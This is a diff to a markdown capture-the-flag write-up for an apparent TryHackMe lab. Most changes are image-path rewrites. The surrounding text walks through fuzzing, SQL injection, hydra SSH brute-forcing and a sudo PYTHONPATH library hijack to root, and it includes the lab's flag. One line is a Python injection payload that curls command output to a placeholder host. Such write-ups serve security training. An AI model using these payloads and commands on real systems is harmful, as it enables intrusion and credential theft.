@@ -21,7 +21,7 @@ sticker: emoji//1f4d8
 ---
 
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250515122728.png)
+![](Pasted image 20250515122728.png)
 
 
 As we can see, we got a login page, let's try to fuzz before trying any vuln such as sqli or xss:
@@ -57,11 +57,11 @@ logout                  [Status: 302, Size: 218, Words: 21, Lines: 4, Duration: 
 
 Seems like nothing important can be found, let's proceed to the login page then.
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250515123053.png)
+![](Pasted image 20250515123053.png)
 
 A good approach is to understand the register process, as we can see, we got to enter the email `id`, this seems weird, let's submit the request to our proxy:
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250515123302.png)
+![](Pasted image 20250515123302.png)
 
 I noticed that at the login page, if we use:
 
@@ -79,12 +79,12 @@ __import__('os').system('curl http://IP:8000?pwned=$(id|base64)')
 This time I had no luck, let's proceed to testing `SQLI` and `XSS` then:
 
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250515124333.png)
+![](Pasted image 20250515124333.png)
 
 If we use that, we get:
 
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250515124345.png)
+![](Pasted image 20250515124345.png)
 
 
 Surprisingly, `SQLI` works, let's proceed to exploitation then.
@@ -113,7 +113,7 @@ Table: users
 
 There we go, we got credentials, let's go into ssh
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250515125529.png)
+![](Pasted image 20250515125529.png)
 
 
 We can begin privilege escalation.
@@ -126,11 +126,11 @@ We can begin privilege escalation.
 
 To begin with, let's use `linpeas` so we can check any PE vector:
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250515133638.png)
+![](Pasted image 20250515133638.png)
 
 As seen, we got another user named `hazel`, we can also find this:
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250515133711.png)
+![](Pasted image 20250515133711.png)
 
 This task runs as `smokey` so we cannot get a root shell with that, if we check inside of `hazel` home, we can find this:
 
@@ -155,7 +155,7 @@ There's a file named `hasher.py`, seems like that could be our way into root, si
 hydra -l hazel -P /usr/share/wordlists/rockyou.txt IP ssh -t 4
 ```
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250515135342.png)
+![](Pasted image 20250515135342.png)
 
 After a while we get:
 
@@ -165,7 +165,7 @@ hazel:hazel
 
 Seems like the user was the password, let's go into ssh with those credentials then:
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250515134533.png)
+![](Pasted image 20250515134533.png)
 
 We can now read the user flag:
 
@@ -244,7 +244,7 @@ sudo PYTHONPATH=/tmp /usr/bin/python3 /home/hazel/hasher.py
 
 If we do this, we can see:
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250515135207.png)
+![](Pasted image 20250515135207.png)
 
 As seen, we get a root as shell and can now read `root.txt`:
 
@@ -253,5 +253,5 @@ root@ip-10-10-160-42:/home/hazel# cat /root/root.txt
 THM{PytH0n_LiBr@RY_H1j@acKIn6}
 ```
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250515135418.png)
+![](Pasted image 20250515135418.png)
 
